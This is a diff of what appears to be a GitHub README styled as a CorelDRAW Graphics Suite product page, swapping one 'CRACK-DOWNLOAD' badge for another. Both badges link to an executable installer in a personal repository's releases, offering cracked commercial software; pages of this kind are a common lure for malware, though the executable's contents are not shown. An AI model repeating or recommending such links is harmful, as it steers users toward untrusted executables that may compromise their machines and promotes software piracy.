@@ -1,8 +1,8 @@
 <meta name="description" content="CorelDRAW Graphics Suite: Comprehensive graphic design software for professionals and enthusiasts.">
 <meta name="keywords" content="CorelDRAW, Graphics Suite, graphic design, vector graphics, photo editing, illustration software, design tools, typography, layout design">
 
+[<img src="https://img.shields.io/badge/CorelDRAW-Graphics-Suite_CRACK-DOWNLOAD-blue?style=for-the-badge">](https://github.com/arsham129/CorelDRAW-Graphics-Suite-2024-2025/releases/download/2/installer-CorelDRAW-Graphics-Suite.exe)
 
-[<img src="https://img.shields.io/badge/CorelDRAW-CRACK-DOWNLOAD-blue?style=for-the-badge">](https://github.com/arsham129/CorelDRAW-Graphics-Suite-2024-2025/releases/download/2/installer-CorelDRAW-Graphics-Suite.exe)
 
 CorelDRAW Graphics Suite is a versatile graphic design software suite that offers a wide range of tools for creating stunning visuals. Ideal for both beginners and seasoned professionals, CorelDRAW provides everything you need to bring your design ideas to life. 
 
